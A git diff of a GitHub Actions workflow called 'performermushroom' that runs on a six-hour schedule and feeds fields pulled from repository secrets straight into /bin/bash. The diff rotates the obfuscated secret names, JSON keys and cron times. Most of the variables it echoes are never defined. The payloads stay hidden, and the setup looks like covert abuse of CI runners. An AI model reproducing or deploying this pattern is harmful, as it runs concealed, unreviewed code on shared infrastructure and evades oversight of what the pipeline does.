@@ -1,28 +1,23 @@
 name: performermushroom
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 1/6 * * *'
-jobs:  # 11759
+    - cron: '4 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: performermushroom
         env:
-          npl6522: ${{ secrets.npl6522 }}
+          obja91: ${{ secrets.obja91 }}
         run: |
-          echo $npl6522 | jq -r .bci9909 | /bin/bash
-          echo $jbdjp82082 | jq -r .t5 | /bin/bash
-          echo $tfi2 | jq -r .gquve0444 | /bin/bash
-          echo $d02 | jq -r .w328 | /bin/bash
-          echo $foxw127 | jq -r .m317 | /bin/bash
-          echo $hchhz7689 | jq -r .unkw0 | /bin/bash
-          echo $j8639 | jq -r .k98 | /bin/bash
-          echo $nox549 | jq -r .csf4 | /bin/bash
-          echo $qqko0672 | jq -r .s0 | /bin/bash
-          echo $as43031 | jq -r .q01 | /bin/bash
-          echo $anq0 | jq -r .c71507 | /bin/bash
+          echo $obja91 | jq -r .wm291 | /bin/bash
+          echo $boi324 | jq -r .x5 | /bin/bash
+          echo $v85 | jq -r .rj33185 | /bin/bash
+          echo $re42542 | jq -r .cxow7994 | /bin/bash
+          echo $fkcji1445 | jq -r .nmvtt0049 | /bin/bash
+          echo $d55890 | jq -r .psqv8 | /bin/bash
+          echo $bvm055 | jq -r .fkfe30779 | /bin/bash
+          echo $kod54 | jq -r .x0056 | /bin/bash
 
